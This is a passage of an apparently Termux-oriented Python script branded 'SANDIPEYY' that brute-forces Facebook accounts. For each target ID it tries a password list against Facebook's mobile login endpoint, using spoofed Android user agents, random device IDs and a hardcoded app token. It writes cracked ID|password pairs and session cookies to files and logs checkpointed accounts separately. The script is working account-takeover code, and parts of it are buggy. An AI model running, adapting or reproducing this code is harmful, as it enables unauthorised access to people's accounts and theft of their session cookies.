                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])                              
                                fbmf = random.choice(["samsung","meizu"])
                                fbbd = random.choice(["samsung","meizu"])
                                android_version=str(random.randrange(6,14))
                                SANDIPEYY = random.choice(["RMX3478","RMX3709","RMX3636","RMX3740","RMX1003","RMX1004", "RMX1005","RMX1007","RMX1009","RMX1011", "RMX1013","RMX1015","RMX1017", "RMX1019","RMX1021","RMX1023", "RMX1024","RMX1027","RMX1029","RMX2001","RMX2002","RMX2003","RMX2004", "RMX2005","RMX2020", "RMX2021", "RMX2022","RMX2023","RMX2024","RMX2030", "RMX2031","RMX2032","RMX2033","RMX2034","RMX2040","RMX2041","RMX2042","RMX2043","RMX2044","RMX2050", "RMX2051","RMX2052","RMX2053", "RMX2054","RMX2060","RMX2061","RMX2062","RMX2063","RMX2064","RMX2070","RMX2071","RMX2072","RMX2073", "RMX2074","Meizu M6","Meizu M6T","Meizu M6s","Meizu M6 Note","Meizu M6s Plus","Meizu 16th","Meizu 16s","Meizu 16Xs", "Meizu 16T","Meizu 16s Pro","Meizu 17","Meizu 17 Pro","Meizu 17T","Meizu 17x", "Meizu 18","Meizu 18 Pro","Meizu 18X", "Meizu 18s","Meizu 18s Pro","Meizu 18s Pro+","Meizu 19","Meizu 19 Pro","MX2","MZ-MEIZU 18s","MZ-16 X","meizu 17 Pro"])
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/SM-A305FN;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"en_US","client_country_code":"US",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [SANDIPEYY-OK] '+ids+' | '+pas+' | '+joined(ids)+'\033[1;97m')
                                        open('/sdcard/m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,coki)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SANDIPEYY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\x1b[1;93m [SANDIPEYY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/brand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [SANDIPEYY-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-G996N;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SANDIPEYY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"		
                                        print("Cookie: "+coki)
                                        open('/sdcard/R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')                                     
                                        open('/sdcard/-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [SANDIPEYY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass                          
def rndm(ids,passlist):
        global oks,loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [SANDIPEYY-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(111111111,999999999))
                        androidon = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","en_AF","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Realme;FBBD/Realme;FBDV/RMX3636;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SANDIPEYY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')                                     
                                        open('/sdcard/-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [SANDIPEYY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass             
                        
try:
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
        print(e)